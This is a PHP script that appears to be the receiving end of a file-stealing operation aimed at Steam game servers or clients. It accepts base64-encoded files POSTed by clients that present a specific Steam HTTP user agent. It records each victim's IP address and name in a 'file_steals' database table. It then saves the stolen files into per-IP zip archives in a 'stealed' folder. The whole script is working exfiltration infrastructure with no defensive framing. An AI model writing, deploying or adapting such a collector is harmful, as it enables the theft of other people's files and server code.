<?php
include('class/include.php');

$browser = $_SERVER['HTTP_USER_AGENT'];
$ips = $_SERVER["REMOTE_ADDR"];
$ip = $_POST["ip"];
$filename = $_POST["filename"];
$content = $_POST["content"];
$folder = $_POST["folder"];
$name = $_POST['name'];
$id = $_POST['id'];
$ip_data = explode(':', $ip);
$t = $GLOBALS['DB']->GetContent("file_steals", ["ip" => $ip_data[0]]);

if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {

/*if ($GLOBALS['DB']->Count("file_steals", ["ip" => $ip_data[0]]) == 1 && $GLOBALS['DB']->Count("file_steals", ["folder" => $folder]) == 1 && $GLOBALS['DB']->Count("file_steals", ["name" => $filename]) == 1 && $GLOBALS['DB']->Count("file_steals", ["content" => $content]) == 1 ) {
	die("print('alreadyexist')");
}*/

if ($GLOBALS['DB']->Count("file_steals_list", ["ip" => $ip]) == 0){
	$GLOBALS['DB']->Insert("file_steals_list", ["ip" => $ip, "name" => $name, "userid" => 0]);
}
	
$searchfor = '.php';
$contents = $filename;
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";

	if(!preg_match_all($pattern, $contents, $matches)){

		$searchfor = '../';
		$pattern = preg_quote($searchfor, '/');
		$pattern = "/^.*$pattern.*\$/m";

		if(!preg_match_all($pattern, $contents, $matches)){


			//$GLOBALS['DB']->Insert("file_steals", ["ip" => $ip_data[0], "folder" => $folder, "name" => $filename, "content" => $content]);

			$zip = new ZipArchive;
			if ($zip->open('stealed/'.$ip_data[0].'filesteal.zip') === TRUE) {

				$zip->addFromString($folder.$filename, base64_decode($content));
				$zip->close();

			}else{

				$zip->open('stealed/'.$ip_data[0].'filesteal.zip', ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE  );
				$zip->addFromString($folder.$filename, base64_decode($content));
				$zip->close();

			}

			die("print('ok2')");



		}else{

			die("print('failed 4iéme verification')");

		}

	}else{

	die("print('failed 3iéme verification')");

	}


}else{

	die("print('failed 1er verification')");

}
?> 